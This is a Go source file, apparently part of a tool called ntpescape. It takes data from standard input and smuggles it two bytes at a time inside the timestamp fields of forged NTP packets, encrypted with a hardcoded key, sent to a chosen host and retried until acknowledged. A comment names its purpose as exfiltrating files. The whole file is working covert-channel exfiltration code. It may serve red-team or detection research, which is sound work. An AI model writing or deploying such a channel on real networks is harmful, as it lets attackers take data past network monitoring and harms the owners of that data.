package send

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"github.com/evallen/ntpescape/common"
)

var key = []byte{0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa}
const timeout = 5 * time.Second

// Goal: Send an NTP packet to myself with the TX timestamp
// looking normal, but the final two bytes being 0a 0b
func Main() {
	host := flag.String("h", "localhost:123", "host: host to send the NTP packets to")
	// infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
	flag.Parse()

	// assuming stdin
	inbuf := make([]byte, 1024)
	reader := bufio.NewReader(os.Stdin)

	for {
		n, err := reader.Read(inbuf)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Fatalf("Error reading STDIN: " + err.Error())
		}

		inbuf = inbuf[:n]

		for i := 0; i < len(inbuf); i += 2 {
			var message uint16
			if i == len(inbuf)-1 {
				message = uint16(inbuf[i]) << 8
			} else {
				message = uint16(inbuf[i])<<8 | uint16(inbuf[i+1])
			}

			keepTryingMessage(message, host)
		}

		inbuf = inbuf[:cap(inbuf)]
	}
}

func keepTryingMessage(message uint16, host *string) error {
	raddr, err := net.ResolveUDPAddr("udp", *host)
	if err != nil {
		return fmt.Errorf("failed resolving host %v: ", err)
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return fmt.Errorf("failed to connect to %v: %v", *host, err)
	}
	defer conn.Close()

	result := false

	for !result {
		log.Printf("Sending packet\n")
		sentPacket, err := sendMessage(message, conn)
		if err != nil {
			log.Printf("error sending message: %v\n", err)
		}

		log.Printf("Waiting for ack\n")
		result, err = waitForAck(sentPacket, conn)
		log.Printf("Finished waiting for ack: %v, %v\n", result, err)
		if err != nil {
			log.Printf("error waiting for ACK: %v", err)
		}
	}

	return nil
}

func sendMessage(message uint16, conn *net.UDPConn) (*common.NTPPacket, error) {
	packet := common.GenerateClientPkt()
	packet.PatchPacketEncrypted(message, key)

	if err := binary.Write(conn, binary.BigEndian, packet); err != nil {
		return &common.NTPPacket{},
			fmt.Errorf("failed sending packet %v to %v: %v", packet, conn.RemoteAddr(), err)
	}

	return packet, nil
}

func waitForAck(packet *common.NTPPacket, conn *net.UDPConn) (result bool, err error) {
	b := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(timeout))
	_, _, err = conn.ReadFromUDP(b)
	if err != nil {
		return false, fmt.Errorf("failed reading ACK from UDP: %v", err)
	}

	var response common.NTPPacket
	err = binary.Read(bytes.NewBuffer(b), binary.BigEndian, &response)
	if err != nil {
		return false, fmt.Errorf("failed reading ACK packet: %v", err)
	}

	if response.OrigTimeSec == packet.TxTimeSec && 
	   response.OrigTimeFrac == packet.TxTimeFrac {
		return true, nil
	}

	return false, nil
}
